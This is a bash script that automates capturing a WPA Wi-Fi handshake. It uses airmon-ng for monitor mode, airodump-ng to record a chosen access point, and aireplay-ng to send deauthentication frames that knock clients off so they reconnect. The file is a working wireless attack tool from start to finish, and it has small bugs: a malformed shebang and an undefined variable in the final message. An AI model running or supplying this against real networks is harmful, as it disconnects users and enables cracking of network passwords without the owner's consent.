#!bin/bash
# Run with root privileges.
wn_interface=${wn_interface:-wlan1}
bssid=${bssid:-"not_specified"}
channel=${channel:-"not_specified"}

while [ $# -gt 0 ]; do

  if [[ $1 == *"--"* ]]; then
    param="${1/--/}"
    declare "$param"="$2"
    echo "$1" "$2"
  fi

  shift
done

airmon-ng start $wn_interface

wn_interface_monitor=${wn_interface}mon

if [[ $bssid == "not_specified" ]] || [[ $channel == "not_specified" ]]; then
  echo "Starting airodump-ng on ${wn_interface_monitor}."

  xterm -title "airodump-ng monitor" -e airodump-ng $wn_interface_monitor &
  read -p "Type BSSID: " bssid

  read -p "Type channel: " channel

  killall xterm
fi

current_time=$(date "+%H.%M.%S")
capture_file_name=wpa_capture_${current_time}

xterm -title "airodump-ng on ${bssid}" -e airodump-ng --bssid $bssid -c $channel --write $capture_file_name $wn_interface_monitor &

echo "In order to keep level of network jamming at minimum you will send deauth by hand. Look on the second terminal if you see 'WPA handshake' (right top coner) you are golden."

continue_loop=true

while $continue_loop; do
  read -p "To send deauth package press [Enter], to exit press [q] " user_input

  case $user_input in
  "")
    echo "Sending deauth."
    aireplay-ng --deauth 1 -a $bssid $wn_interface_monitor
    ;;
  "q")
    echo "Quitting..."

    killall xterm
    continue_loop=false
    ;;
  *)
    echo "Wrong input, use [Enter] or [q]."
    ;;
  esac
done

echo "Your handshake is in ${file_name}."
echo "Reversing ${wn_interface_monitor} back to ${wn_interface}."
airmon-ng stop $wn_interface_monitor
